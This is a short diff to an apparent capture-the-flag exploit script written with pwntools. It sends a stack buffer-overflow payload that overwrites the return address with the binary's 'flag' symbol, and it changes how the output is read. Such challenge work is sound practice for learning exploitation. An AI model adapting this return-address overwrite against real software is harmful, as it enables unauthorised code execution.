@@ -4,6 +4,7 @@ gen_filename = ""
 
 e = ELF(gen_filename)
 p = e.process()
+p.readline()
 
 dest = e.symbols['flag']
 
@@ -13,5 +14,5 @@ payload +=  8 * b'b'  # rbp
 payload += p64(dest)  # rip
 p.sendline(payload)
 
-p.stream()
+print(p.readlineS())
 
